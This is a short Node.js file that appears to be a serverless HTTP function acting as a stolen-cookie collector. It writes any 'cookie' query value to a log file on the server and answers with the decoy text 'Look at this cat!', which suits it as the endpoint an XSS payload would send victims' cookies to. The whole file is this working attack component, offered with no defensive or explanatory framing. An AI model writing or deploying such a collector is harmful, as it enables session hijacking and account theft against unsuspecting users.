var fs = require('fs');

module.exports = async function (context, req) {

    if (req.query.cookie) {
	    fs.writeFile('/home/log.txt', req.query.cookie, (err) => {
		    if (err) {
			    throw err;
		    }
	    })
        context.res = {
            // status: 200, /* Defaults to 200 */
            body: 'Look at this cat!'
        };
    }
    else {
        context.res = {
            status: 400,
            body: "Nothing here, make sure to pass the correct value!"
        };
    }
};
